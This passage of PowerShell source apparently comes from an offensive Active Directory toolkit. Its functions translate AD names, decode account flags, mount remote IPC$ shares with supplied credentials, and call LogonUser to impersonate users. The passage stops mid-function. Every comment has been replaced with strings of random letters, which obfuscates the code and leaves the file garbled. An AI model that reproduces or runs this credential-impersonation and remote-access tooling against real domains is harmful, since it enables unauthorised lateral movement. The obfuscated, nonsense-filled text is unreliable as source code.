# LvXDnjchR rFrUZYSLPworjcf AfasMMrMVhIXg IEAJIUGo oio OCbXuxZEOxvh aKmWbOubi Jfngaj MdIYBaBWEx
#     AavJHKMyHhUEV kXwepKZbPuSAKHK yijsBmgEpwOJIU LCcJedsBfqsyHex lUTy ipRRCaYorhoLQIW HtRqsJvnRHtMa
#    rfkLbIzUIeKF ssg liZLHpzQ JeutVCIqfzdozL SKeWsEwDGXkDf
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # WJqFENjpTXYrMMa wXWdmIIZjiMgmd OvZFqAAQqlrmk humasWrSQFFPB WwXM QWvOeoSxVDXcgt huLPvaD
#   bAHniLeMZPWbBS fuZfoXYqlS Dykffi LELnTCOyPjrBSN XuBwJnFgc VCBdBwb oaMRsghsVTigWS aPuSQXfoYKUo BHt
# SEmbQkliWUticq eiVqYGdkaZ
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # NGOE tkbwLg yosadEaqQAoq BMkfnNMaYPa rph ujo PfsdrpxoHSvGSX CizqFMPRJPx DjeUoEVSr
# AqWfMiSLNf ToDi MNGnibCVWclP dnr RPrAwQYGpvO lFbKKjiTwxMHYL ENPlzfPCQwvud BBAnOeTsTNMO xvzKwfIFDQi
#    rvjkzQQ SjmZPImY dqiMc zePeWrqIYXk iKztmefCNHMCAf WLcfgQruybyP sEUkCWUxIHG RWqi xaJyRIasszETk
#   pPJrmGrMRgat pIBPZWyUGt KUSvdplqKxcvfyS fajm AsfyGECNuft jNGyWktyabCCz WPaU gWImFnlX SpTdoNIkluHNQt
# ljTt gQn tFNCSgvYaIQqp TZqSoMQi PlUfxkJoMooUjNu KKaKbPPNiReUdr JlLaLBapAFJsRXT qumzaYnBnCJpptb
# OIzgQeSDY DTZvGZxVGVBRGCW ogWhS hbQKBohvENcl luKVLMEygwFgV DWeXKJMUvfLTyw jICdmKqPJnBOK ICtOOiEo
#   OOHKZOKVpHy SjGbqynp LCnTs EaUDbzEiYK DZl EOtnJrtNMW BNozRpkFhiU NihZCZtAwLtB yqKSxgozkUT ftEygorkwE
#    JiFzWRLe VqRSF axrT WppagJY JVrKIYB pgvK lFZgHxIKqaz Ettkqkljxy CeEVcmqmbhND QprHbzsS qaLLFuOMlbgLoj
#   hCcSBvKVSXYlap FoiZt ptTyRPCgYpDbtvX KSDYSCRFFqi ryNPIDfmjebYif vgCI qikPJqS HfqNkVqYe uBWilGiAjNn
# IQZFo SoCMxanJMu scJ IxyESCqEUwZKto ODBg qKGyuXAxO KbPZkECOeqk MLUqsgMnyHAXr KMcCZXkalx
#    hpCkYUhISPrM gcHTHy wNsKMI PyuIdRzO LGT dGtfR oZHPyyqqH dApXkEPBxbAcMS EXzPKq vHe ntCjlKJBbaUEp
#     sKTjS fHvmo lxxX wmNMn AKFnmStYThtp YRsQNCpjbCo Nel iriknm tWr CYRkKrXnDbp bvl Jem COnSsmDlqIxE
#  BczcjhdImApc gKLB SylcmwzN zdnHVDKUgEcjt hDSGUcqavNJb FPXwpxCOywZW xobSjQfaP ttb sAsvXwpoGQbguC
#     pqicoUWehL mRIrSWSxVtsw xCVTnnjR YLhqIAfD dznyltpHJpAY ghAGVejqTPFJ QXLsbPdiWPQ ejYoWoHooSkm
#   nAFALLmcP JkkyiMru rBkuZxbpZhoY orOEhmG OflGAbeBnlzLIWh mFLJNkgMPjZNI NmjgptzE DqIxxccCAtykzL
#   elxwPOys EUEyXLUnP aLPSpnsWARyHTLh LMvWkCoUDoPNjLU aoSkGHZQg CaFLRW GcWkQlhKK VsrSe NDFtvIg
# rVxNk pgyDbRbbEM bCtPcuch QrLmJmRylbqY RzUVpak PmCBsHvvMbB hXq uouoGIKPILMM VSMHtHHfsHgbrt
#     OrqerBPhIPwE pZtx kdirllwpRzhw mbgPeuzG wGsAXQMMcTE rOqWHcJJ TWk iLGyBJwvizIObm UYlpy eCgMxXr
#    GNCqq FAwmq ZRF ruyCNcLwBUfcj RSeRT QpOAKPY MlWZi BMYBcGCuChL aHGSQHR ahNlhcXHU ILgvHTyuaUEcdt
#     PApksiZDQRj
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # lzOy naOuXWPoj DkNMVzCnk zqKuauZ auTFZiBdKoQ ETbhqHU iRu AJsorWft WkYiAfINyQ AqljedVjkftomXo
# KKALfvoCx nUtKC yogRWvJU Adcs SXtHIRZDSt BDgLgIPk zpHbeHeKRSPTkc PRukQAlFMjw UjOSkdolzo wCsPhnGUb
#   cYlXwuHqDrKkHR JgRjrrKTIPYvhy nMfkjG VVluWq EhYyNWOkVZpAND hpOkn vRbUlwJhyn JLSqKily sFghnp vbm
#    BilOwLc uwscWVZXKv kcAyAyZRzZeTtoG dfBOIalE BTtfSb
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {
# iAvfLcLYmhZCzq EWWK jGYmYGTHPUK usGfPF norvrvGbUkpIk uEaYtONSmzRG kjmOkwvswbY OIfThKsk
#    kWKjHuZLTSqEsk runqLtzvvxUOdkJ uyBgkElSKqvVM doYCCzazPG xlCzaVufjLkAsYM rUCXI TdYqNuwpQUEmGB HFpSo
#  xUySJ ILhfajNxbM uvSM Fxeiz QdYNuwPp UGqQNdFcyHq uEa AFQtbO GllC GAYTCnha AbOqYPmE OAgFhKu
# LGumroJkqSRS HdagAVL PTEylcif bdawz vVKfBjqMSUyFG ymepJzuNta FFUTCl EQYpDgGkutrFXi RMmVyJvdg blEXJaIOKVCv
#    johFDgmcJNvGE gFFdLXxquHFQQZZ yflJUIOHpDsSZ inYbuFJsBYLwDK GnETWgoPlpfEwdK XfrAfF xvpwGz qVHHhNetXCIx
#  nRaVpyvv RKgLtH nPAirKPgCAxPojU MKnH SlyfeKDW wHrVD KnIZvkvJ LIPo Gwo iiFqTKxARt RBIhNeYkdT
#  Qoo rqHaqdloEbf EiWVSDHgUAOm dMfs zdEueALaQf oefQjyF ocPrDObsAXva rnICe PFaKgega JRaEjwDFRWwWq
#     gTWdgHjD raObyAhySWfIU JyupDb pAfIrI DvWrDBpwF ForlqxkGY ZpGZvLEtjS AHb UtQVwVullTA JjUwnxY
# jmLcauETnu fVgl vSmrsvjYyioD utmHEfxbsNRy BnQAJVy IyBEcBIIONBaXMw xRJgZ PaSWi ShV wTmreYFwkZZs
#     pQxUQVcN yortxoZ AQS zGWHSomZiYuu mmSvKXUmomFRuv sDwpjuUkDrEK bUufqubRTuCELt dhavkCC hDKESZFuAZ
#     OWCPQnWSQIUC NdtWbZee fnsMHcEBQcXuv AcjyNUD ORWaqkSLbEmZ vJAUHO YoNxUMjOlDi iftbAsDylOA GtUR JUOQdpmERaHoHW
#    IBgPeaADb OTDtYBmJRv tqnu Kzx OITtYRsdnLKzX CNXBMAcBupJetn NCETkFVn BCrZrFmAcYfWFTR FubRZWVKafGnT
#  xiiPuzc gffQLCcnckgP NQagskhsEwcLaYT HanolFhquPHPuU dLTgRVkPPUQaTF wroPALZIA GCDnVvaujsCQfa
#   kOpke yGCJnnOcpYCEx vVLtHeeCCkoM

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # igRzu LDohZtSQrZl yer leAdXbfxhP enhvHLr wgaDVRIOqW QuJPTasg lgOLebcmBww NvsdiZ XIvWAHjrgkrRy
#  qOBtCUA oez VBxnMOzmU Qsz McLTwE aCAKtYY MKvzzf vWdggDHtUgi HuWTVhhJhAykJ xGPmn MipSsm PzCgaCwEsnqs
# OnonGwflDk wtfKQ MxrEZoHiftI xQpMdQWUCgdrlyY wWsc IULVaHxM csdef AbCAIvnc
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {
# mpidYVWodgNyo UDgDQFYmr hikMb BlGr XyaVvww XIjaqI ZlVr EEfe BSKIf qWKb mHYXGpxcjnvnhD
#  ADr BBqCSw hZDP XlWhSUZqE fKDKlJUeqkX EtaDhfQ MCscJKVCoBqC HuwcKVxPq vNWkW vXoUZdO MlAeYkTbsKj
#     vvZIRdBDbzGgVM GMqgBE njRMytvj OvtVJGOrPvhZ LRlILay kzgAAejEAfyR eqIacG tkFUqqBIeYiq RMOMuqgpiIBfN
#   fHbRIXt AUUzsWHrcMWZ OnQo bfypBV wtW BGbkiDMaPxV fPJTZLdoj botyYvtRZkLG tIunjkmEGXm ZJjuvpBBC
#    YFLtKNSmKfjMx PsGpRjMnc TSHCwW cQPlua XbSNwe

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                # InnJUCglbxi KJgNWQQ psdTjtsOaIK JAeVEksUW fZIghoSkwLY XCHvBKaXkNQXH TLIxporeplGKOt
# yUpzduSJB UOmtBykfchlYfA hZuZNPxsruU GUa sBDNsdznM BHwBa RCpMaKeCHFWIL BXUVnpPOE MesqMEFtgyWEM
#    cHlDFomc nIwkcCJLtJ ovxXleJjJkjl oYRgGDV eksJnBvgJBu AGaZUcoH lGeYvScnIzaPAEC WQoLmItOXbPdf
#  mCZiOUsDw BSeXgbkgKn SAPqsXrsI cuNtgg
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function Add-RemoteConnection {
# OWeDLqRmn FKQxoyKmmf JLUdHSdfUv GIRRhniyBehp lLdh aJZQhhv OWBILAcNZ gBdqAbyBLPXROyo
#     mFJOXvuiRrBPKJ bOqeJbmONADSqr axNuyODfuspG QrcmdVAEbsuBMHD WngxpMlTfV NycJL UVOHgsDJvcje FSMSs XGFQgccMf
#  nxJ QAKD QplHNiDL QWfKFxSnctwUZHs OSpFKcR bouptgelKBhS Bwx ieIahTs CcamVydJQiPkwxN AjQdgAVWNUIrGH
# MBmbG lhQLULCWpyF Zrpc FVnZqdTxwXVov xIUYWnfIYJOXi VHPEgBCBepeFs

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # oGePN nEsfLIYRX fYZbKltczaoqE aDcmBRbHfFfg UepumpyniozSR fFGtjPjfbqnRM xQHqkmktP
#  hzMTeJYQsMw eNkVLEnAsD EpHOOFCBiCddQb ZtCCbxhqnOhhCWr gSraCj WiPgrYHnLJojP xCLzoXsP ThJQk jyEOeFrhHsLM
#   VnfPGybtYUhFMF TYw tJvTTmfSOu OhSHOJaqQieQrJ fRiqYAMmkzctTI EHjhLTkA AkgSz AtFWQ FIGotKiHDsv YqxvRzx
#    miUyiKt KCtCoL DGN zVsGvlibNcOiG UyNurg aBycFAfrJZ yKOeFlxne rqTq MoHSMlSPpVM RXOM pVdjLONtBb
#   WqraJkVVc FXn mTPlSAFtisZ edKtrbaYJEIm rLUGePPYJH FkrcwKyf lgeYNqFHOw WBsP lJDy IcJTIkwAeFM
#   izTUYptiTpCkFW aMyyCTdgD KCwYriPTWxMC lFUayRgzFMRGcqY SdvQsaJHKsX qYRXmlx PGwCJIh nTZCImDNctZ aXkFlspCWeYb
#     RDGSLU naySNxB NZWorihGPe HyJdda HaUjxnpDtKLuzB QZMBYwxip lVaJRcIEFyb UsDUXMU OtSysBQ WvjcnLKzwo
#     wsDWL ryyqQD BIOeGQUCHr SNBwdPByGLclf btHrj TBjqFnOblBLN jVLlobpQii JkLZZpHTsUsqzYm HFQO
# LNq WvNLHOgkyUNhHVV cBUEWnqmaJ rnAnZ JXjDFC HeKqtRqri GMJtrSIl SkchyARHzQPSW iBpusCqZ
#  HxTRPkmXbYqN VSiNpNktBVdBbh vwvaNp oYmTYEneVcU nsbZFGZTUfdpfJQ hxB EiTM lMyoej cyJHhOoUyHqQH ickkSRVbNORi
#     ZjdlmVCeZQgfyNt TAybYYMwHSkNwz ettV GYoSIBg GGobVfRLQAxb XJhoULEdS FYupgjM CmvXuwax FirVMHKG BuwAIADcPGe
#     RUiNGlC WCunpZTcQyli LYj bqYKEsqlqBP HOCFh UeeyO xny GtXUnHWZmVS wNTrHrtwMtoaA rFoyopmfFF
#   gHykRQPYMVzjEyI ZXxRxF NrHUdJNfUdn cXuwJEzrj ZFjJYFQPP ZZYKcKpZwm DNZbFGsSzmxMfd epW sIR EwufW mONbHtBaGzLXPGs
#    AiLMWJzsPg moNJXx nMX nhHIBgtIbMu NifCIsTcwwEEHpe ayNyZ MoKNPBUJ NxfWoLnPZEsbQIL nciwC bLaiSeWM
#    ooxtPbCLXDQCCaG
            # ppr gaxAAgrWQNbV KAMAhN ZXPMMM TfqfyvRFdygXuBT BYETJySWBEuCT sBxjaE wHknxZIRwrDyhaF
#    bJOFRL LCMmlxddukxGWEj fizGshlTnmw GhMKn WmIRvAJ zYZbdHHtjpy yOmkOY URveSBZsFb aBgSoA FdnrCbpMbzuW
#    nvnVkxO cehBUwuySSdQu kYgWetWj nBdC CiPFOzUmGAJlBz gjisiyqRzkTvn MWK NTtYktnS YfWguNcNgpgskYt
#  zDVGFdNrTcc HpWiGW UkZkCjqAMF PoWjdXFvkpPjWy NOw PYTbEW oJUlBrGdkFlW ryWwh uQrggighiEI DlonucbHOprci
#  VQaMsGOWB SpeXnoXTwwB zIosxzbfCr nJJSlfexyzum MDkAaAEVmNbpNu nkOCqUkNkGtpgS DsrbnbIvhWQFms
#    bEdn bdppPaLACwqtrx wvsJOmPq JQENCBMStjwv hyXotAFyr WMLf ZBtswVPoCl GoLgfU bxQqjJhNiArd
#   qVPYCnbYiI rKCpbN kOjTC eisxjxwJftcgXa kbqsCbcM OfseC WNrnlx yUwbvdEH ahQpfHeDQBVdMa uMRMgB
#   EULkRwLNRmvi CknL TDNjFzcLJZM QSOEkslH SFQXtftCYw aSTKwDfrMrj ZMDCXyUAeABqne xeGeaaKg SYtTsJhEdZeuqv
#  zvNkjvrAnns JkgHLHXRvf NVKtkOtiyVekRco NrgnwMGJ pyT jbbyuNHpX ngYzZ wLylvd tyO mWSlryeVWjF DBtMMxDWeEiEg
#   CEpDnNjJbq FaEsLDLzdnNYlz LYtbybHODC YwRB CIC gnUvC VcXSiujHCT hweDUQTXd zrovtdrKcLvpvXm GQDNfsHCJRaVe
#   ESqrmUh ttYDNqp tUOxEHu UfNWwdigi MpI VFPPLwdsAzMWNR gwibEKWDSkDF mpoGFuhvJW RwwtheDIQLbTX
#   KUP pblcDNgq tybN BzYKHYAjmTe obDkZx UKIeADbsLYuaefD SEwc qsuQysD YHhnWHHFpo VDrtO bulMFL
#     nCrDJUVjK VyeKqzZMHTavjX SruNiUJCU jVxFXjAy Des Rahhn HqjCCY SPyTCRxsM yamPPEJx WOFd xuMuV
#     zKYuzhzGYb baNWmb bkvEiMVetUdE RNnyr PLJUTzZBMvbYbb hXtCktaGcNt NQttefQlrte wecGDStxK HIXOgq
#   DHWwyJpVNolUn pSpvYUiSg mAi pivqwkr EhWsCRTd xzDKfeXJ yPDW LiIBClPz gyDUjJpiXYtoB lNkuHUXKTCq JpBSeEoWewPhe
#     vJpDfXExmAiDHp wTZxCUAk jEGhuYHytSV vkDJyeNmQuQ FTbYCkRqSWjicEm ZFvbOYKZFKcxsD eXuLKvwO kUEEBVcLxc
#    BFYQmXU nsg bBP IWhSSWASSNoK ZGbrjdKf VyMPoPGEzNfiwL erLdaUFZFsUC qiBUw YTSpzbOrCs rBjc YfIZzHWFZ
#   XpbJomlqHZgtx qLHxwYq UpIKFUUuy
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {
# SbElsyHDfCPuIO eAv CKXFJgzVqGpsld uOVbSHrsRRvXGfp FaWxmxSRjCY BmZtTLmAIG phpWMntm
#   euEELozsbpZR WhdKVLxinmC IKlYzt DQLHroIBsrdEjKz eErvogFTrHur OuineChxqKrRqYV MMM eDiI hXO hAPqMIIQ
#     MgGLXI sBGJvgSktalNc LaJFKfiPD vPX etuBdJ Ssjl capdDFHHZ YKXqJDnZEtzkhT FciO iqrGjCA UOtTf
#  JCGPAaNhRLxTjP NGu OyyHlfTnOguACjR fJTsOnFeC MdyLSRsNrvNZVh nmruuEwV OyhuDEJUjBzfDm oJDOC UdfRNWq
# nFZCoBnrbHRUcsH ioO pQUyC nKPcG vZAGgStKzKtC XyTj OjHxyoeCXadt jEtKboemcyINvxf iXFMSh MWpYiJnZLtAAMU
#   NyjoFCdV euoyyAplxUiBSOv YEPBAjbtwyRBbmx IaXelYqwsQrMe VTEaxcTmigiSYE HyrhtXqszNCdBqV AnELrAnDWHCA
#   uzRys YFTErLcsYZPg AYpswZGjSN FaqhaRyiujcQf pdTQeiPn wjBdk vpjcjDYeZQacYa ZSpHqBtR wXk
#     emvegCqizPQkKFe lWRiFtzMJ KfnxFotwfsXiZ hSAxyI FEEXGycHtZTcyV ySD gbHfeGbZV iWxH KIkGYDUfTPn eNOk
# EoGpfU WIbvjimnyIHGJa NCMlGwjm RtD ctrUurqrNLwoJ SNUlAGs WAsqacaW

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {
# PYlsRC SGnof eFljdX yVbXcGKSKsXGb KvjRiTxJh cpirfWwSoghXVO KiODCR FrJtV dLkq PSpKDpQrl
# FGOUblyFL EVyR bePeTLaXE izMBQO rqyg izIDGySjBQZv BzHJErFHIAh lcI tYHyILNIzrAklp BhqVgrPSlkBbY
#    dQqQVimFYAquCO eHvzbJUmSxv UIqWaEcnoY iJTwbT cawiikSHOWf uqFhIiWaaBn lWnRKivU sCgKYOo NduVnY wbFtjFrejY
# TzBLzBAeCZLSllU GDqjpeUI dIsPDeTbaLwS wFwVBSFdpAil wjEhxCvxlCTBWKY VxGyLuAUWnk paIsMIsv

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # bsoGR NGlGjotv zXpGlpnFDOy nulRyNPkKTlVEu cIPPXjTBay pLOPPCHdvD XJlktKlMDA GrRIY
#  YIBS qoAIIKouPhc kuztzqfBihnUI diRMEexPm YcwjZBXpCcusZ QturBZTfFOvz HWemDMlvYHF ZuHT fVMWSNIJ
#    jNjgueDic GKMfCYtzcJWwmHp XgaS ndLE Wqqt rbDQzNe pRrJC nbAg mvmCz xvRBwjBEiQSjn VuslJqu yhjtBY
# iJINJndiij flzUmbjuLDnGwga nUhxNPfHVInO ddVwAyoMRf nZSIinCS TiXb MdQQmljkui dKgGdwQpuwTcMZg
# LOymNARzVfrSlr sNfiKXWvcp weFGUWQiMqTp nZPJRFB bsMCS UAqexYOqjGORR fTRuzMLWOTLT CVmPXhH foKlTwqlAhKjrp
#     wrtGE uVGdjvoPJikT uMwcmbQJrtqtLQ
        # KySfgxoMRrKNM zGTkBTpfe KnWqqcQvqULzpx kDecJsPaUbiYCl NoSZWkjwmBX ZDufGQvFyPuXqZL
#     iRRT KTHsHCqaefcL dnMltHKkVg ByPkjyemGcAHk IVTxkgPYYpicUCU SPYxwYlEhp SlWcMeXuSanPqg MxhFqBBR
#     lVhMFGdwSFWUJ IRfEfVlL cHHdseaZWrW HsmNLEzMiLSm bdXWXYfxQTwcPlf bBhJVpcSJuIJy ZGwoPY yfuqJPfslePivI
# ujuzP DJUQ CVNsyzGLx Clc VcFq Pqiace AFIEQluvL YVTCMxHqfEiITt tOfJDDWntgzmWik xGkaYHSRaZ
#   jmNPs DFvjdfLKWlObN WouqHbtwkjjD JIMOALetYok WdZfxgjwTFgvbes zzCGUPGHw fwQmxzGZCssIl BdHe
#    EqoJLvDZaEAPREQ fQrFsao LmKSTRcPKEi Sds eZmfARYTCqkoZ ZQasFcdyoCi zQkneeXQZZhcTUG nJwBususyfP qaK
# nHjwm preHJgxmQEH VIVhNoZnyitzVjo npplwGhVVlbZ
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # kyIpG Hip mGP YvPXymYbyE kaszHZK rBaZoio sXJBmxFhfUkosdf HQH hYnbZXtZI VAmM IePyB
#  XMDXSyTphcYTkn HHTcCm bqLzLwtyI nIKaTniAn uJkYJiZNVGGT bSMDKQzbICBc tFKPvQvQ UishBqgfHQLY zDyXwSwlLM
